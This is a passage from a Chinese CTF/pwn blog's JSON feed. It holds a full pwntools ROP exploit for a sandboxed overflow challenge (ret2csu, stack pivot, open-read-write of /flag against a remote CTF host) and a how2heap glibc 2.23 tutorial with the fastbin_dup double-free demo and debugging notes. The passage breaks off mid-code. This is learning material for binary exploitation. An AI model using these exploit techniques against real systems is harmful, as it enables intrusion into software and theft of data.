data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/%E9%B9%8F%E5%9F%8E%E6%9D%AF/Z8N8W%60IJD5UTBGR4RU%29Y%29XV.png\" alt=\"\" /></p>\n<p>ida 查看，发现 read 函数能导致溢出<br />\n<img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/%E9%B9%8F%E5%9F%8E%E6%9D%AF/J3J%28%24A%7ED%29XD71LQ%2881Y9VZT.png\" alt=\"\" /></p>\n<p>这里开启了沙盒：</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/%E9%B9%8F%E5%9F%8E%E6%9D%AF/DKFBJH%29X1HKP2BWD0%60%25QS%296.png\" alt=\"\" /></p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/%E9%B9%8F%E5%9F%8E%E6%9D%AF/%25%25Q%7D0_6FS%24Q7O1%7E14%40%7EKN8M.png\" alt=\"\" /></p>\n<p>没有限制执行 orw 的系统调用，所以利用 orw 获得 flag</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'172.10.0.8'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'9999'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#p = process('./silent')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./libc-2.27.so'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>context<span class=\"token punctuation\">.</span>binary <span class=\"token operator\">=</span> <span class=\"token string\">'./silent'</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>binary <span class=\"token operator\">=</span> context<span class=\"token punctuation\">.</span>binary</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>rop <span class=\"token operator\">=</span> ROP<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>binary<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>stdout <span class=\"token operator\">=</span> binary<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'stdout'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>io_stdout<span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_2_1_stdout_'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">csu</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">,</span> a<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> b<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> c<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">global</span> io_stdout</pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    offset <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span>sys<span class=\"token punctuation\">]</span><span class=\"token operator\">-</span>io_stdout</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    io_stdout <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span>sys<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    rop<span class=\"token punctuation\">.</span>ret2csu<span class=\"token punctuation\">(</span>edi<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> rsi<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> rdx<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> rbp<span class=\"token operator\">=</span>stdout<span class=\"token operator\">+</span><span class=\"token number\">0x3d</span><span class=\"token punctuation\">,</span> rbx<span class=\"token operator\">=</span>offset<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    rop<span class=\"token punctuation\">.</span>call<span class=\"token punctuation\">(</span><span class=\"token number\">0x4007E8</span><span class=\"token punctuation\">)</span><span class=\"token comment\"># add [rbp-0x3d], ebx</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    rop<span class=\"token punctuation\">.</span>ret2csu<span class=\"token punctuation\">(</span>call<span class=\"token operator\">=</span>stdout<span class=\"token punctuation\">,</span> edi<span class=\"token operator\">=</span>a<span class=\"token punctuation\">,</span> rsi<span class=\"token operator\">=</span>b<span class=\"token punctuation\">,</span> rdx<span class=\"token operator\">=</span>c<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token comment\"># gdb.attach(p)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token comment\"># pause()</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>rop<span class=\"token punctuation\">.</span>raw<span class=\"token punctuation\">(</span><span class=\"token string\">b'1'</span><span class=\"token operator\">*</span><span class=\"token number\">64</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token comment\"># read 0x1000</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>rop<span class=\"token punctuation\">.</span>ret2csu<span class=\"token punctuation\">(</span>edi<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> rsi<span class=\"token operator\">=</span><span class=\"token number\">0x601300</span><span class=\"token punctuation\">,</span> rdx<span class=\"token operator\">=</span><span class=\"token number\">0x1000</span><span class=\"token punctuation\">,</span> call<span class=\"token operator\">=</span><span class=\"token number\">0x600FE0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token comment\"># rop.call(0x400700)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>rop<span class=\"token punctuation\">.</span>migrate<span class=\"token punctuation\">(</span><span class=\"token number\">0x601340</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>payload <span class=\"token operator\">=</span> rop<span class=\"token punctuation\">.</span>chain<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token comment\"># gdb.attach(p)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token comment\"># pause()</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>rop <span class=\"token operator\">=</span> ROP<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>binary<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>rop<span class=\"token punctuation\">.</span>raw<span class=\"token punctuation\">(</span><span class=\"token string\">b'/flag'</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>csu<span class=\"token punctuation\">(</span><span class=\"token string\">'open'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x601300</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>csu<span class=\"token punctuation\">(</span><span class=\"token string\">'read'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x602000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">100</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>csu<span class=\"token punctuation\">(</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x602000</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>csu<span class=\"token punctuation\">(</span><span class=\"token string\">'exit'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>rop<span class=\"token punctuation\">.</span>chain<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/%E9%B9%8F%E5%9F%8E%E6%9D%AF/XP23%602U5RVLZ6CTYFFVB%5DZS.png\" alt=\"\" /></p>\n",
            "tags": [
                "how2heap"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/10/19/pwn/%E4%B8%93%E6%A0%8F/how2heap%202.23/",
            "url": "https://vvwwvv.cn/2023/10/19/pwn/%E4%B8%93%E6%A0%8F/how2heap%202.23/",
            "title": "how2heap(glibc2.23（1）)",
            "date_published": "2023-10-19T11:23:15.000Z",
            "content_html": "<h1 id=\"编译及链接\"><a class=\"anchor\" href=\"#编译及链接\">#</a> 编译及链接</h1>\n<h2 id=\"首先安装对应glibc版本\"><a class=\"anchor\" href=\"#首先安装对应glibc版本\">#</a> 首先安装对应 glibc 版本</h2>\n<p><code>./download 2.23-0ubuntu3_amd64</code></p>\n<h2 id=\"编译程序\"><a class=\"anchor\" href=\"#编译程序\">#</a> 编译程序</h2>\n<p><code>gcc  -g -no-pie fastbin_dup.c -o fastbin_dup</code></p>\n<p>【这里 - g 是可以根据代码对应的行数来下断点】</p>\n<h2 id=\"链接对应版本的glibc库\"><a class=\"anchor\" href=\"#链接对应版本的glibc库\">#</a> 链接对应版本的 glibc 库</h2>\n<p>22.04</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"><span>l</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> patchelf --set-rpath /home/pwn/pwn/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ fastbin_dup </pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">sudo</span> patchelf --set-interpreter /home/pwn/pwn/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-linux-x86-64.so.2 fastbin_dup</pre></td></tr></table></figure><p>编译完后运行程序，发现报错：</p>\n<pre><code>/home/pwn/pwn/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6: version `GLIBC_2.34' not found (required by /home/pwn/Desktop/how2heap/how2heap-master/glibc_2.23/fastbin_dup)\n</code></pre>\n<p>貌似 gcc 是高版本的问题而 glibc 是低版本，手动编译</p>\n<p><code>sudo wget http://ftp.gnu.org/gnu/glibc/glibc-2.23.tar.gz</code></p>\n<p><s>然后。。发现 how2heap 提供了编译，直接 <code>make clean all</code>  就能根据对应的 <code>glibc</code>  编译全部程序</s></p>\n<p>18.04</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"><span>l</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> patchelf --set-rpath /home/ctfshow/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ fastbin_dup</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">sudo</span> patchelf --set-interpreter /home/ctfshow/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so fastbin_dup</pre></td></tr></table></figure><p>这个就没有报错</p>\n<h1 id=\"bin的大小及合并\"><a class=\"anchor\" href=\"#bin的大小及合并\">#</a> bin 的大小及合并：</h1>\n<h2 id=\"fast-bin\"><a class=\"anchor\" href=\"#fast-bin\">#</a> fast bin</h2>\n<pre><code>从0x20到0x80(64位,大小不是malloc时的大小，而是在内存中struct malloc_chunk的大小，包含前2个成员)，且在放进fsatbin中不会进行合并也就是他的prev_insuer一直为零\n</code></pre>\n<p>合并时机：</p>\n<p>fastbin 会在以下情况下进行合并（合并是对所有 fastbin 中的 chunk 而言）。<br />\nmalloc：</p>\n<ol>\n<li>在申请 large chunk 时。</li>\n<li>当申请的 chunk 需要申请新的 top chunk 时。<br />\nfree：</li>\n<li>free 的堆块大小大于 fastbin 中的最大 size。（注意这里并不是指当前 fastbin 中最大 chunk 的 size，而是指 fastbin 中所定义的最大 chunk 的 size，是一个固定值。）</li>\n</ol>\n<p>另外：malloc_consolidate 既可以作为 fastbin 的初始化函数，也可以作为 fastbin 的合并函数。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYnMua2FueHVlLmNvbS90aHJlYWQtMjU3NzQyLmh0bQ==\">https://bbs.kanxue.com/thread-257742.htm</span></p>\n<h2 id=\"smallbin\"><a class=\"anchor\" href=\"#smallbin\">#</a> smallbin</h2>\n<pre><code>小于1024字节（0x400）的chunk称之为small chunk，small bin就是用于管理small chunk的。\n\nsmall bin链表的个数为62个。\n\n就内存的分配和释放速度而言，small bin比larger bin快，但比fast bin慢。\n</code></pre>\n<p>合并操作：</p>\n<p>相邻的 free chunk 需要进行合并操作，即合并成一个大的 free chunk</p>\n<p>free 操作</p>\n<pre><code>small的free比较特殊。当释放small chunk的时候，先检查该chunk相邻的chunk是否为free，如果是的话就进行合并操作：将这些chunks合并成新的chunk，然后将它们从small bin中移除，最后将新的chunk添加到unsorted bin中，之后unsorted bin进行整理再添加到对应的bin链上（后面会有图介绍）。\n</code></pre>\n<h2 id=\"largebin\"><a class=\"anchor\" href=\"#largebin\">#</a> largebin</h2>\n<pre><code>大于等于1024字节（0x400）的chunk称之为large chunk，large bin就是用于管理这些largechunk的。\n\nlarge bin链表的个数为63个，被分为6组。\n\nlargechunk使用fd_nextsize、bk_nextsize连接起来的。\n</code></pre>\n<p>合并操作：类似于 small bin</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vdHJ1bmsvcC8xNjg2MzE4NS5odG1s\">https://www.cnblogs.com/trunk/p/16863185.html</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDUzMjg1L2FydGljbGUvZGV0YWlscy85Njg2NTMyMQ==\">https://blog.csdn.net/qq_41453285/article/details/96865321</span></p>\n<h1 id=\"1fastbin_dupc\"><a class=\"anchor\" href=\"#1fastbin_dupc\">#</a> 1. <code>fastbin_dup.c</code></h1>\n<p>介绍了 double free 的漏洞，再 free 后指针没有被置空的情况，可以再次释放，导致我们后面申请的两次堆块可以指向同一个 chunk 进行利用</p>\n<h2 id=\"1源码\"><a class=\"anchor\" href=\"#1源码\">#</a> 1. 源码：</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;assert.h></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"This file demonstrates a simple double-free attack with fastbins.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Allocating 3 buffers.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>a <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>b <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>c <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"1st malloc(8): %p\\n\"</span><span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"2nd malloc(8): %p\\n\"</span><span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"3rd malloc(8): %p\\n\"</span><span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Freeing the first one...\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t<span class=\"token function\">free</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"If we free %p again, things will crash because %p is at the top of the free list.\\n\"</span><span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t<span class=\"token comment\">// free(a);</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"So, instead, we'll free %p.\\n\"</span><span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t<span class=\"token function\">free</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Now, we can free %p again, since it's not the head of the free list.\\n\"</span><span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t<span class=\"token function\">free</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\\n\"</span><span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\ta <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\tb <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\tc <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"1st malloc(8): %p\\n\"</span><span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"2nd malloc(8): %p\\n\"</span><span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"3rd malloc(8): %p\\n\"</span><span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\t<span class=\"token function\">assert</span><span class=\"token punctuation\">(</span>a <span class=\"token operator\">==</span> c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"2调试程序\"><a class=\"anchor\" href=\"#2调试程序\">#</a> 2. 调试程序</h2>\n<h3 id=\"执行前18行后查看堆情况\"><a class=\"anchor\" href=\"#执行前18行后查看堆情况\">#</a> 执行前 18 行后，查看堆情况</h3>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/A2M%7EC%7B8YU2IDD8VI45Y44XM.png\" alt=\"\" /></p>\n<h3 id=\"执行第19行\"><a class=\"anchor\" href=\"#执行第19行\">#</a> 执行第 19 行：</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">free</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>可以从下面看到 <code> chunk a</code>  已经进入 <code>fastbin</code> ，然后此时 <code>fastbin</code>  只有他一个，并且是第一个进入的，所以 fd 为 0</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/J7%24SE7D%7DVSAXC3%7EO%7DF%60T%24%29H.png\" alt=\"\" /></p>\n<h3 id=\"再执行到25行freeb\"><a class=\"anchor\" href=\"#再执行到25行freeb\">#</a> 再执行到 25 行 <code>free(b)</code></h3>\n<p>可以发现，释放的 <code>chunk b</code>  fd 指向了前面释放的 <code>chunk a</code> ，这里是由于 fastbin 的后进先出的由于， <code>fastbin-&gt;新释放的chunk-&gt;上一个释放的chunk</code></p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/%7E%4097B%60%7DQ53%5BB%254EK%40Y%40RRFH.png\" alt=\"\" /></p>\n<h3 id=\"执行第28行freea\"><a class=\"anchor\" href=\"#执行第28行freea\">#</a> 执行第 28 行 <code>free(a)</code></h3>\n<p>这里就发现了，将已经释放过的 chunk a 再次释放，就会导致被再次添加到 fastbin 中（原本 a 第一次进入 fastbin 中没有改变 chunk 的结构），所以会被当作新释放的 chunk 来放入 fastbin</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/0XQ25GYB%40VN2%25HUB6K%40F%24JT.png\" alt=\"\" /></p>\n<h4 id=\"这里其实有个隐藏的问题为什么不直接连续释放两次chunk-a\"><a class=\"anchor\" href=\"#这里其实有个隐藏的问题为什么不直接连续释放两次chunk-a\">#</a> 这里其实有个隐藏的问题：为什么不直接连续释放两次 chunk a？</h4>\n<pre><code>这里会有一个检测，指向新释放的chunk是main_arena(我写他为fastbin很便于理解)，再释放的时候仅仅验证了main_arena指向的chunk，第一次释放chunk a后，main_arena会指向chuank a，那么紧接着再次释放chunk a，会被通过检测main_arena指向的chunk给识别出来，导致错误\n\n这里在glibc2.23源码是：3935行\n</code></pre>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">__builtin_expect</span> <span class=\"token punctuation\">(</span>old <span class=\"token operator\">==</span> p<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\">//if you release the same address twice，就报错 double free 错误</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t    errstr <span class=\"token 